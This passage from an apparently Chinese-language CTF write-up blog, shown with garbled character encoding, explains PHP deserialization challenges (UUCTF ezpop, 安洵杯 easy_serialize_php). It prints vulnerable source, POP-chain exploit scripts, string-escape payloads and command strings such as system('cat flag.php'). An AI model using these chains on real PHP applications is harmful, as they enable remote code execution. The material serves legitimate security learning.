·çš„è¯æˆ‘ä»¬çš„eval($this-&gt;a)å°±ä¸èƒ½è¢«æ‰§è¡Œ</p><p>ä¸€èˆ¬æ¥è®² ç»•è¿‡wakeupå°±æ˜¯æˆå‘˜å±æ€§çš„æ•°é‡æ¯”å®é™…çš„å¤§å°±å¯ä»¥ </p><p>å°±æ‹¿ä¸Šé¢æ¥è¯´ï¼šå°†testå®ä¾‹åŒ–æˆå¯¹è±¡ç„¶åè¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™ç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">2</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">3</span>;&#125;<br></code></pre></td></tr></table></figure><p>å°±æ˜¯å°†testâ€:3 æ”¹æˆtestâ€:4 å³å¯ ä½†ä½ çœ‹ä¸‹é¢çš„æ­£åˆ™åŒ¹é… </p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/test&quot;:3/i&#x27;</span>,$a))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ è¾“å…¥çš„ä¸æ­£ç¡®ï¼ï¼ï¼æä»€ä¹ˆï¼ï¼&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå€¼æ˜¯ä¸èƒ½å˜åŒ–çš„ é‚£ä¹ˆå°±ä¸èƒ½é€šè¿‡è¿™ä¸ªè¿›è¡Œç»•è¿‡</p><p>è¿™å°±è¦å¼•å…¥äº†ä¸€ä¸ªçŸ¥è¯†ç‚¹ ï¼šå¼•ç”¨çš„æ¦‚å¿µï¼šç®€å•æ¥è®²å°±æ˜¯ä¸¤ä¸ªå˜é‡æŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªåœ°å€å— æ‰€ä»¥ä¸¤ä¸ªå˜é‡å…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªå˜é‡äº†</p><p>æˆ‘ä»¬å¯ä»¥å°†aå’Œbè¿›è¡Œä¸€ä¸ªå¼•ç”¨ å†åˆ©ç”¨ä¸‹é¢çš„</p><p> $this-&gt;b=$this-&gt;c;    cçš„å€¼èµ‹ç»™äº†b è¯´ç™½äº†ä¹Ÿå°±æ˜¯ç»™äº†a</p><p>è¿™æ ·å°±å¯ä»¥ç»•è¿‡äº†wakeup ç»¼ä¸Šæ‰€è¿°  popå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-number">1</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c=<span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;c;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-variable">$d</span>-&gt;b=&amp;<span class="hljs-variable">$d</span>-&gt;a;<br><span class="hljs-variable">$d</span>-&gt;c=<span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="UUCTF-2022-æ–°ç”Ÿèµ›-ezpop"><a href="#UUCTF-2022-æ–°ç”Ÿèµ›-ezpop" class="headerlink" title="[UUCTF 2022 æ–°ç”Ÿèµ›]ezpop"></a>[UUCTF 2022 æ–°ç”Ÿèµ›]ezpop</h1><p>è¿™ä¸€é¢˜è€ƒå¯Ÿçš„æ˜¯ååºåˆ—åŒ–åˆ©ç”¨å¼•ç”¨ç»•è¿‡wakeupå’Œåˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸æ„é€ æ¶æ„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UUCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>,<span class="hljs-variable">$key</span>,<span class="hljs-variable">$basedata</span>,<span class="hljs-variable">$ob</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$str</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key===<span class="hljs-string">&quot;UUCTF&quot;</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;ob=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;basedata));<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">output</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">rce</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">nothing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;t;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">youwant</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rce</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$pdata</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;data&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pdata</span>))<br>&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">UUCTF</span>(<span class="hljs-variable">$pdata</span>));<br>    <span class="hljs-variable">$data_replace</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;hacker&quot;</span>,<span class="hljs-string">&quot;loveuu!&quot;</span>,<span class="hljs-variable">$data</span>);<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data_replace</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå¼•ç”¨ç»•è¿‡ wakeup ä¸Šé¢é‚£ä¸€é¢˜è·Ÿè¿™ä¸ªå¾ˆåƒ æ‰€ä»¥å°±ä¸å†è¿‡å¤šçš„ç®€è¿°</p><p>é“¾å­å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">output</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;<span class="hljs-title function_ invoke__">rce</span>();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">nothing</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b=<span class="hljs-variable language_">$this</span>-&gt;t;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">youwant</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rce</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">output</span>();<br><span class="hljs-variable">$d</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">nothing</span>();<br><span class="hljs-variable">$e</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">youwant</span>();<br><span class="hljs-variable">$e</span>-&gt;cmd=<span class="hljs-string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span>;<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-variable">$e</span>;<br><span class="hljs-variable">$d</span>-&gt;b=&amp;<span class="hljs-variable">$d</span>-&gt;a;<br><span class="hljs-variable">$d</span>-&gt;t=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$d</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶åä¸ºä»€ä¹ˆè¦è¿›è¡Œä¸€ä¸ªbase64ç¼–ç å‘¢ å› ä¸ºä¸Šé¢çš„</p><p> $this-&gt;ob=unserialize(base64_decode($this-&gt;basedata));</p><p>å…ˆæ¥è¯´ä¸€ä¸‹åé¢çš„å®ç°è¿‡ç¨‹ </p><p>ä¸‹é¢postä¼ å…¥ä¸€ä¸ªå€¼ ç„¶åç»™äº†pdata è¿™ä¸ªpdataä¹Ÿå°±ç›¸å½“äºä¸Šé¢çš„ $this-&gt;name=$str;</p><p>ç„¶åè¿›è¡Œä¸€ä¸ªæ›¿æ¢åŒ¹é…åˆ°äº†hackerç»™æ›¿æ¢æˆloveuuï¼è¿™ä¸ªè”æƒ³åˆ°äº†å­—ç¬¦ä¸²é€ƒé€¸å¢åŠ </p><p>æœ€åè¿›è¡Œä¸€ä¸ªååºåˆ—åŒ– è¿™é‡Œè§¦å‘äº†ä¸Šé¢çš„wakeup</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;key===<span class="hljs-string">&quot;UUCTF&quot;</span>)&#123;<br>           <span class="hljs-variable language_">$this</span>-&gt;ob=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$this</span>-&gt;basedata));<br>       &#125;<br>       <span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;oh!you should learn PHP unserialize String escape!&quot;</span>);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><p>å¯¹basedataçš„å€¼è¿›è¡Œä¸€ä¸ªbase64è§£ç å¹¶ä¸”ååºåˆ—åŒ–</p><p>æœ€ä¸‹é¢çš„å¯¹ä¼ å…¥çš„postçš„å€¼è¿›è¡Œä¸€ä¸ªåºåˆ—åŒ– è¿™é‡Œçš„keyå’Œbasedataéƒ½æ˜¯ç©ºå€¼ å› ä¸ºå®ƒæ¥æ”¶çš„æ˜¯ä¸Šé¢çš„nameçš„å€¼ æ‰€ä»¥è¿™é‡Œä¸ºäº†ä¸‹ä¸€æ­¥wakeupé‡Œé¢çš„è¿›è¡Œ è¿›è¡Œäº†ä¸€ä¸ªå­—ç¬¦ä¸²é€ƒé€¸</p><p>â€œ;s:3:â€keyâ€;s:5:â€UUCTFâ€;s:8:â€basedataâ€;s:176:â€Tzo3OiJub3RoaW5nIjozOntzOjE6ImEiO047czoxOiJiIjtSOjI7czoxOiJ0IjtPOjY6Im91dHB1dCI6MTp7czoxOiJhIjtPOjc6InlvdXdhbnQiOjE6e3M6MzoiY21kIjtzOjIzOiJzeXN0ZW0oImNhdCBmbGFnLnBocCIpOyI7fX19â€;s:2:â€obâ€;N;}   236ä¸ªå­—ç¬¦  éœ€è¦236ä¸ªhacker</p><h1 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h1><p>è¿™ä¸€é¢˜çš„è¯è€ƒå¯Ÿäº†å¯¹å­—ç¬¦ä¸²é€ƒé€¸çš„ç†è§£ä»¥åŠå˜é‡è¦†ç›–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><br><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆæ¥çœ‹ä¸€ä¸‹æ•´ä½“çš„æ€è·¯ï¼š å°±æ˜¯è®©file_get_contentså»è¯»å–flagæ‰€åœ¨çš„è·¯å¾„</p><p>fæ¥æ”¶äº†functionçš„å€¼ ä¸‹é¢çš„extractå‡½æ•°ä¼šè¿›è¡Œä¸€ä¸ªå˜é‡è¦†ç›–</p><p>å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] =<span class="hljs-string">&#x27;123&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;è¦†ç›–å‰ï¼š&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;è¦†ç›–åï¼š&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558152.png" alt="image-20230703154953884"></p><p>å…ˆçœ‹çœ‹phpinfoé‡Œé¢æœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ å‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶å   d0g3_f1ag.php</p><p>ç„¶åæˆ‘ä»¬è¦åˆ©ç”¨file_get_contents  è¿›è¡Œè¯»å–çš„è¯  éœ€è¦æ»¡è¶³$_GET[â€˜img_pathä¸ºç©º å½“å®ƒä¸ºç©ºæ—¶ åˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸å°†guest_img.png  è¿™ä¸ªåå­—å˜æˆ</p><p> d0g3_f1ag.phpçš„åå­—</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558666.png" alt="image-20230703155417260"></p><p>æ­£å¸¸çš„æ˜¯è¿™ä¸ª </p><p>ç„¶åå°†AAæ¢æˆflagæˆ–è€…å…¶ä»–å­—ç¬¦çš„è¯å°±å¯ä»¥è¿›è¡Œå­—ç¬¦ä¸²é€ƒé€¸</p><p>æˆ‘ä»¬éœ€è¦çš„æ˜¯ï¼š<br>â€œ;s:3:â€imgâ€;s:20:â€ZDBnM19mMWFnLnBocA==â€;}  å°±æ˜¯å°†base64å­—ç¬¦æ¢ä¸€ä¸‹ è¿™ä¸ªé•¿åº¦æ˜¯ä¸å˜çš„ æ›´æ–¹ä¾¿äº†</p><p>æœ€ç»ˆæµ‹è¯•ç»“æœï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">_SESSION[flagphpimg]=;<span class="hljs-symbol">s:</span><span class="hljs-number">3</span><span class="hljs-symbol">:<span class="hljs-string">&quot;123&quot;</span><span class="hljs-string">&quot;;s:3:&quot;</span>img<span class="hljs-string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA=</span>=<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ctfshow-æ„šäººæ¯-easy-php"><a href="#ctfshow-æ„šäººæ¯-easy-php" class="headerlink" title="ctfshow æ„šäººæ¯ easy_php"></a>ctfshow æ„šäººæ¯ easy_php</h1><p>è¿™ä¸ªæ˜¯åœ¨php7.3ä¸‹ç»•è¿‡wakeupçš„ä¸€ä¸ªtrick</p><p>è¿™ä¸ªçš„è¯æ˜¯ä½¿ç”¨phpçš„ä¸€äº›å†…ç½®ç±»è¿›è¡Œç»•è¿‡çš„ã€‚ç”¨Cå¼€å¤´ç»•è¿‡wakeup</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code 